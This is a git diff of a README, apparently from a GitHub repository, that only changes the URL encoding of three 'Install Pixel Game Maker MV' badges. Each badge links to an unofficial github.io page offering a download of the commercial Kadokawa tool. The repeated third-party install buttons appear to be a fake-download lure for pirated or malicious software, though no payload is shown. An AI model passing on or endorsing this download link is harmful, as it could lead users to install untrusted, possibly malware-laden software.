@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Pixel Game Maker MV](https://img.shields.io/badge/⬇_Install_Pixel%20Game%20Maker%20MV-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Pixel Game Maker MV](https://img.shields.io/badge/⬇_Install_Pixel+Game+Maker+MV-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Pixel Game Maker MV is a 2D action game creation tool from Kadokawa (makers of R
 
 <div align="center">
 
-[![⬇ Install Pixel Game Maker MV](https://img.shields.io/badge/⬇_Install_Pixel%20Game%20Maker%20MV-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Pixel Game Maker MV](https://img.shields.io/badge/⬇_Install_Pixel+Game+Maker+MV-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Pixel Game Maker MV is a 2D action game creation tool from Kadokawa (makers of R
 
 <div align="center">
 
-[![⬇ Install Pixel Game Maker MV](https://img.shields.io/badge/⬇_Install_Pixel%20Game%20Maker%20MV-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Pixel Game Maker MV](https://img.shields.io/badge/⬇_Install_Pixel+Game+Maker+MV-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
